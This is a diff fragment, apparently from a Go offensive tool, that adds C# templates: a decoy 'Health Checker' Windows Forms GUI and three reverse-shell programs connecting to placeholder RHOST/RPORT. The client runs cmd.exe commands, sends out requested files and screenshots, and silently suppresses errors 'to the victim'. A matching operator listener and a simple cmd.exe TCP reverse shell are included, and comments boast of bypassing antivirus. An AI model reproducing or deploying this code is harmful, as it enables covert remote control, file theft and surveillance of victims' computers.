+            this.btnCPUUsage.Name = "btnCPUUsage";
+            this.btnCPUUsage.Size = new System.Drawing.Size(180, 56);
+            this.btnCPUUsage.TabIndex = 1;
+            this.btnCPUUsage.Text = "CPU Usage";
+            this.btnCPUUsage.UseVisualStyleBackColor = true;
+            this.btnCPUUsage.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // btnUpdateCheck
+            // 
+            this.btnUpdateCheck.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnUpdateCheck.Location = new System.Drawing.Point(36, 71);
+            this.btnUpdateCheck.Name = "btnUpdateCheck";
+            this.btnUpdateCheck.Size = new System.Drawing.Size(180, 56);
+            this.btnUpdateCheck.TabIndex = 0;
+            this.btnUpdateCheck.Text = "Check Updates";
+            this.btnUpdateCheck.UseVisualStyleBackColor = true;
+            this.btnUpdateCheck.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // button3
+            // 
+            this.button3.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button3.Location = new System.Drawing.Point(241, 133);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(180, 56);
+            this.button3.TabIndex = 3;
+            this.button3.Text = "Hidden Files";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.btnUpdateCheck_Click);
+            // 
+            // Form
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 17F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(460, 222);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.btnUpdateCheck);
+            this.Controls.Add(this.btnCPUUsage);
+            this.Controls.Add(this.btnHealthCheck);
+            this.Controls.Add(this.headerpanel);
+            this.Font = new System.Drawing.Font("Century Gothic", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Margin = new System.Windows.Forms.Padding(4);
+            this.MaximizeBox = false;
+            this.MaximumSize = new System.Drawing.Size(460, 250);
+            this.MinimizeBox = false;
+            this.Name = "Form";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Health Checker";
+            this.headerpanel.ResumeLayout(false);
+            this.headerpanel.PerformLayout();
+            this.ResumeLayout(false);
+
+        }
+
+	}`
+
+var AvBusterCustomCSharpRevShellClient = `using System;
+	using System.Diagnostics;
+	using System.Drawing;
+	using System.Drawing.Imaging;
+	using System.Net;
+	using System.Net.Sockets;
+	using System.Text;
+	using System.Threading;
+	using System.Windows.Forms;
+	
+	namespace client
+	{
+		class Program
+		{
+			static void Main(string[] args)
+			{
+				try
+				{
+					StartClient(); 
+	
+				}
+				catch (Exception)
+				{
+	
+				}
+			}
+	
+			static string getresult(string command) 
+			{
+				Process p = new Process();
+				p.StartInfo.FileName = "cmd.exe";
+				p.StartInfo.Arguments = "/c " + command;
+				p.StartInfo.UseShellExecute = false;
+				p.StartInfo.RedirectStandardOutput = true;
+				p.Start();
+	
+				string output = p.StandardOutput.ReadToEnd();
+				p.WaitForExit();
+	
+				return output;
+			}
+	
+			private static string getscreen()
+	
+			{
+				string fname = "myscreen.png";
+				try
+	
+				{
+					Bitmap captureBitmap = new Bitmap(1024, 768, PixelFormat.Format32bppArgb);
+					Rectangle captureRectangle = Screen.PrimaryScreen.Bounds; // here we are taking only primary screen if you want to use in real time env loop through all screns and take screen shots
+					//Creating a New Graphics Object
+					Graphics captureGraphics = Graphics.FromImage(captureBitmap);
+					//Copying Image from The Screen
+					captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
+					captureBitmap.Save(fname, ImageFormat.Png);
+				}
+	
+				catch (Exception)
+				{
+				}
+				return fname;
+			}
+			public static void StartClient()
+			{
+				IPAddress ipAddress = IPAddress.Parse("RHOST"); 
+				IPEndPoint remoteEP = new IPEndPoint(ipAddress, RPORT);
+				// Create a TCP/IP  socket.    
+				Socket sender = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+				sender.Connect(remoteEP); // connect to ur remote server
+	
+				while (true) // start an infinite loop
+				{
+	
+					try
+					{
+						string data = "";
+						string result;
+	
+						var buffer = new byte[1024];
+						int bytesRead;
+						int lineposition = -1;
+	
+						do
+						{
+							lineposition = Array.IndexOf(buffer, (byte)'\n'); // checks for the position of new line
+							//Console.WriteLine(lineposition);
+							bytesRead = sender.Receive(buffer);
+							data += Encoding.ASCII.GetString(buffer, 0, bytesRead);
+	
+						}
+						while (lineposition >= 0); // this loop is for accepting command from the server . it reads till it find a new line in received buffer
+						//Console.WriteLine("Text received : {0}", data);
+	
+					   
+						if (data.ToLower().StartsWith("getfile")) // if the command starts with getfile 
+						{
+							string[] filename = data.Split(new char[] { ' ' });
+							sender.SendFile(filename[1]); // sends the file to the controller 
+							Thread.Sleep(700); // waits for some time before sendig the end of command indication to the server
+							sender.Send(Encoding.ASCII.GetBytes("EOF")); // we are sending this to indicate the remote machine that all contents sent , time to save the file
+						} else if (data.ToLower().StartsWith("bye"))
+						{
+							break; // for terminating the connection by breaking the loop 
+						} else if (data.ToLower().StartsWith("grabscreen")) // if command is grabscreen take screen shot and send it to remote server
+						{
+						  string  sendscreen =  getscreen();
+							sender.SendFile(sendscreen);
+							Thread.Sleep(700);
+							sender.Send(Encoding.ASCII.GetBytes("EOF")); // everything is like sending a file 
+							System.IO.File.Delete(sendscreen); 
+						}
+						else
+						{ // here is the core command execution , instead of sending the shell over tcp , we send only the command's result
+							result = getresult(data);
+							//Console.WriteLine(result);
+							byte[] msg = Encoding.ASCII.GetBytes(result + "EOF");
+						   // Console.WriteLine(msg.Length);
+							sender.Send(msg);
+							//sender.Shutdown(SocketShutdown.Both);
+						}
+	
+					}
+					catch (ArgumentNullException ane) // we throw all exceptions to the main function and supress it there since we dont need to indicate any error to the victim
+						{
+						throw ane;
+						}
+						catch (SocketException se)
+						{
+						throw se;
+						}
+						catch (Exception e)
+						{
+						throw e;
+						}
+	
+				   
+				}
+			   sender.Shutdown(SocketShutdown.Both); // out side the loop , close connection
+			   sender.Close();
+			}
+		}
+	}
+	`
+var AvBusterCustomCSharpRevShellManager = `using System;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+
+namespace sharpshells
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            StartServer();
+        }
+
+        public static void StartServer()
+        {
+           
+            IPAddress ipAddress = IPAddress.Parse("RHOST"); // stars server in this ip 
+            IPEndPoint localEndPoint = new IPEndPoint(ipAddress, RPORT); // this port
+            try
+            {
+
+                // Create a Socket that will use Tcp protocol      
+                Socket listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+                // A Socket must be associated with an endpoint using the Bind method  
+                listener.Bind(localEndPoint); // bind the socket to the end point
+                // Specify how many requests a Socket can listen before it gives Server busy response.  
+                // We will listen 10 requests at a time  
+                listener.Listen(10); // listen for connections
+                Socket handler;
+                Console.WriteLine("Wait for your bot...");
+                handler = listener.Accept(); // accept the connection from the victim
+                string botip = handler.RemoteEndPoint.ToString(); // fetch the remote ip and port info from the handler socket
+                while (true)
+                {
+                    Console.Write("[{0}] # : ",botip); // this is prompt u see when victim connects back to u
+
+                    // Incoming data from the client.    
+                    string val = null;
+
+                    val = Console.ReadLine(); // waiting for ur command , reads a line (terminates with a new line)
+                    if (val == "bye")
+                    {
+                        
+                        break; // breaks from the loop and disconnects
+                    }
+                    if (val.StartsWith("getfile") ) // gets the file from victim and saves it 
+                    {
+                        byte[] msg = Encoding.ASCII.GetBytes(val);
+                        int bytesSent = handler.Send(msg);
+                        Console.WriteLine("Send file command {0}", val);
+                        string[] getfilename = val.Split(new char[] { ' ' }); // actual command will be getfile filename // space is the delimiter
+                        using (var output = File.Create(getfilename[1]))
+                        {
+
+                            // read the file in chunks of 1KB
+                            var buffer = new byte[1024];
+                            int bytesRead;
+                            string clientmsg = "";
+                            while ((bytesRead = handler.Receive(buffer,0,  buffer.Length, SocketFlags.None)) >= 0)
+                            {
+                                clientmsg = Encoding.ASCII.GetString(buffer, 0, bytesRead);
+
+                                if (clientmsg.IndexOf("EOF") > -1) // this eof is end from the victim hope u remember that when i went through the client
+                                {
+                                    break;
+                                }
+                                output.Write(buffer, 0, bytesRead);
+                                
+
+                            }
+                        }
+                        Console.WriteLine("Got and saved as {0}", getfilename[1]);
+                    } else if (val.StartsWith("grabscreen")) // same operation like file above
+                    {
+                        byte[] msg = Encoding.ASCII.GetBytes(val);
+                        int bytesSent = handler.Send(msg);
+                        Console.WriteLine("Send file command {0}", val);
+                        using (var output = File.Create("victimscreen.png"))
+                        {
+
+                            // read the file in chunks of 1KB
+                            var buffer = new byte[1024];
+                            int bytesRead;
+                            string clientmsg = "";
+                            while ((bytesRead = handler.Receive(buffer, 0, buffer.Length, SocketFlags.None)) >= 0)
+                            {
+                                clientmsg = Encoding.ASCII.GetString(buffer, 0, bytesRead);
+
+                                if (clientmsg.IndexOf("EOF") > -1)
+                                {
+                                    break;
+                                }
+                                output.Write(buffer, 0, bytesRead);
+
+
+                            }
+                        }
+                        Console.WriteLine("Got and saved as victimscreen.png") ;
+                    }
+                    else
+                    {
+                        // Encode the data string into a byte array.    
+                        byte[] msg = Encoding.ASCII.GetBytes(val);// + "EOFCMD"); // here val is the command we take from keyboard it has a newline character as builtin terminator that we check in client
+
+                        // Send the data through the socket.    
+                        int bytesSent = handler.Send(msg); // converted the string to byte array to send it over the socket
+                        Console.WriteLine("send msg = {0}", Encoding.ASCII.GetString(msg));
+                        // Receive the response from the remote device.   
+
+                        var buffer = new byte[1024];
+                        int bytesRead;
+                        string clientmsg = "";
+
+                        while ((bytesRead = handler.Receive(buffer, 0, buffer.Length, SocketFlags.None)) >=0) // receives the command result and saves it in a variable clientmsg
+                        {
+                            clientmsg += Encoding.ASCII.GetString(buffer, 0, bytesRead);
+                            if (clientmsg.IndexOf("EOF") > -1)
+                            {
+                                break;
+                            }
+
+                        }
+                        clientmsg = clientmsg.Replace("EOF", "");
+                        Console.WriteLine(clientmsg);  // displays the command output for u
+                       
+                    }
+
+                }
+               handler.Shutdown(SocketShutdown.Both); // closes all connection 
+               handler.Close();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.ToString());
+            }
+
+            Console.WriteLine("\n Bye for now...");
+            Console.ReadKey(); // let me show u how it works , how can u bypass ur antivirus :) // build it in release mode recommended , here i am using debug mode binaries ,, it is for my test :)
+        }
+    }
+}
+
+`
+
+var AvBusterSimpleRevShell = `using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.Net;
+using System.Net.Sockets;
+
+
+namespace NormalTcp
+{
+	public class Program
+	{
+		static StreamWriter streamWriter;
+
+		public static void Main(string[] args)
+		{
+			using(TcpClient client = new TcpClient("RHOST", RPORT))
+			{
+				using(Stream stream = client.GetStream())
+				{
+					using(StreamReader rdr = new StreamReader(stream))
+					{
+						streamWriter = new StreamWriter(stream);
+						
+						StringBuilder strInput = new StringBuilder();
+
+						Process p = new Process();
+						p.StartInfo.FileName = "cmd.exe";
+						p.StartInfo.CreateNoWindow = true;
+						p.StartInfo.UseShellExecute = false;
+						p.StartInfo.RedirectStandardOutput = true;
+						p.StartInfo.RedirectStandardInput = true;
+						p.StartInfo.RedirectStandardError = true;
+						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+						p.Start();
+						p.BeginOutputReadLine();
+
+						while(true)
+						{
+							strInput.Append(rdr.ReadLine());
+							p.StandardInput.WriteLine(strInput);
+							strInput.Remove(0, strInput.Length);
+						}
+					}
+				}
+			}
+		}
+
+		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception err) { }
+            }
+        }
+
+	}
+}`
